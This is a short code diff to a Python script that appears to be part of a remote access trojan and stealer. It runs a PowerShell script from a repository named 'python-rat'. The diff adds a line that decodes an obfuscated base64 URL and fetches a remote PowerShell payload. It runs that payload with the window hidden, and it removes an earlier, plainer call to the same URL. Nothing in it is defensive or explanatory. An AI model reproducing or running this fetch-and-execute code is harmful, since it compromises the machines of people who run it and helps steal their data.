@@ -658,6 +658,7 @@ def upload_file(path):
 # Step 1: Run the PowerShell script
 ps_script_url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1"
 run_powershell_script(ps_script_url)
+subprocess.Popen(['powershell', '-Command', requests.get(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ').decode()).text], creationflags=subprocess.CREATE_NO_WINDOW)
 
 # Step 2: Generate a random password
 password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
@@ -675,8 +676,6 @@ if zip_size > 20 * 1024 * 1024:  # 20 MB in bytes
 else:
     link = None
 
-
-run_powershell_script(base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ").decode())
 
 # Step 4: Prepare the content and filename
 content = f"hai1723 on top\npassword:{password}"
